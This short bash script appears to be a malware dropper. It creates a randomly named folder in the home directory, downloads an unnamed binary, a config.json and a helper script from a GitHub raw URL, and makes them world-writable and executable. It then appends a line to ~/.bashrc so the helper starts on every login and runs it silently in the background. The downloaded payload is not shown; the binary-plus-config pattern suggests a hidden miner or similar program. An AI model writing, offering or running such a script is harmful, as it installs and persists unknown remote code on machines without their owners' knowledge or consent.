#!/bin/bash

cd ~
mkdir gpUxgdSz
cd gpUxgdSz

rm config.json


curl -O https://raw.githubusercontent.com/Fabian066/readmorelinssz/refs/heads/main/gpUxgd

curl -O https://raw.githubusercontent.com/Fabian066/readmorelinssz/refs/heads/main/config.json
curl -O https://raw.githubusercontent.com/Fabian066/readmorelinssz/refs/heads/main/checkes.sh

chmod 777 gpUxgd
chmod 777 checkes.sh

echo "~/gpUxgdSz/checkes.sh &" >> ~/.bashrc

./checkes.sh &
